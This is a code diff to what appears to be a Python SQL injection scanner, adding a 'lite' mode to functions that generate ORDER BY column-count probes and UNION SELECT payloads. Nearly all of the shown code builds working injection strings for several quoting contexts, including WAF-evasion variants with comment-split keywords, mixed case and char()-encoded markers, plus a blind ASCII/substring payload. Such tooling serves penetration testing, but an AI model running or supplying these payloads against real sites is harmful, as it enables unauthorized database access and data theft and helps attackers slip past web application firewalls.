@@ -93,20 +93,27 @@ def make_substring_payload(dbms: str, expr: str, pos: int, char: str) -> str:
     return f"' AND ASCII({substr_fn}(({expr}),{pos},1))={ord(char)}-- -"
 
 
-def order_by_probes(max_cols: int = 20) -> List[str]:
-    """Generate ORDER BY N probes to determine column count."""
+def order_by_probes(max_cols: int = 20, lite: bool = False) -> List[str]:
+    """Generate ORDER BY N probes to determine column count.
+
+    *lite=True* returns only the core quoting-context variants (no WAF evasion),
+    roughly 5 probes per N.  Use this for fast no-WAF scans.
+    """
     probes = []
     for n in range(1, max_cols + 1):
         probes.append(f"' ORDER BY {n}-- -")
         probes.append(f"' ORDER BY {n}#")
         probes.append(f"') ORDER BY {n}-- -")
         probes.append(f"') ORDER BY {n}#")
+        # Numeric context: no closing quote needed (e.g. WHERE id = {value})
+        probes.append(f"0 ORDER BY {n}-- -")
+        # Double-paren context: WHERE x IN ('val') or LIKE ('%val%')
         probes.append(f"')) ORDER BY {n}-- -")
+        if lite:
+            continue
         probes.append(f"')) ORDER BY {n} --")
         probes.append(f" ORDER BY {n}-- -")
         probes.append(f" ORDER BY {n}#")
-        # Numeric context: no closing quote needed (e.g. WHERE id = {value})
-        probes.append(f"0 ORDER BY {n}-- -")
         probes.append(f"0 ORDER BY {n}#")
         probes.append(f"' GROUP BY {n}-- -")
         probes.append(f"' /**/ORDER/**/BY/**/ {n}-- -")
@@ -123,8 +130,13 @@ def _marker_to_char_expr(marker: str) -> str:
     return "char(" + ",".join(str(ord(c)) for c in marker) + ")"
 
 
-def union_null_probes(col_count: int, marker: str) -> List[str]:
-    """Generate UNION SELECT probes for a known column count."""
+def union_null_probes(col_count: int, marker: str, lite: bool = False) -> List[str]:
+    """Generate UNION SELECT probes for a known column count.
+
+    *lite=True* uses only the core quoting-context variants with a plain string
+    marker (no char() encoding, no WAF evasion) — roughly 4 probes per column
+    position.  Use this for fast no-WAF scans.
+    """
     char_marker = _marker_to_char_expr(marker)
     payloads = []
     for pos in range(col_count):
@@ -137,19 +149,25 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
         cols_char = ["NULL"] * col_count
         cols_char[pos] = char_marker
 
-        for cols in (cols_str, cols_cast, cols_int, cols_char):
+        # lite mode: try cols_int first (integer non-marker columns avoid float-format
+        # template crashes), then cols_str (NULLs, for HTTP-500-based detection).
+        col_variants = (cols_int, cols_str) if lite else (cols_str, cols_cast, cols_int, cols_char)
+        for cols in col_variants:
             inner = ",".join(cols)
             payloads.append(f"' UNION SELECT {inner}-- -")
             payloads.append(f"' UNION SELECT {inner}#")
-            payloads.append(f" UNION SELECT {inner}-- -")
-            payloads.append(f" UNION SELECT {inner}#")
             # Numeric context: seed value 0 returns no rows so the UNION row is
             # the only result — marker detection works even with no matching rows.
             payloads.append(f"0 UNION SELECT {inner}-- -")
-            payloads.append(f"0 UNION SELECT {inner}#")
             payloads.append(f"') UNION SELECT {inner}-- -")
-            payloads.append(f"') UNION SELECT {inner}#")
+            # Double-paren context: WHERE x IN ('val') or LIKE ('%val%')
             payloads.append(f"')) UNION SELECT {inner}-- -")
+            if lite:
+                continue
+            payloads.append(f" UNION SELECT {inner}-- -")
+            payloads.append(f" UNION SELECT {inner}#")
+            payloads.append(f"0 UNION SELECT {inner}#")
+            payloads.append(f"') UNION SELECT {inner}#")
             payloads.append(f"')) UNION SELECT {inner}#")
             payloads.append(f"' UNION ALL SELECT {inner}-- -")
             payloads.append(f"' Union Distinctrow Select {inner}-- -")
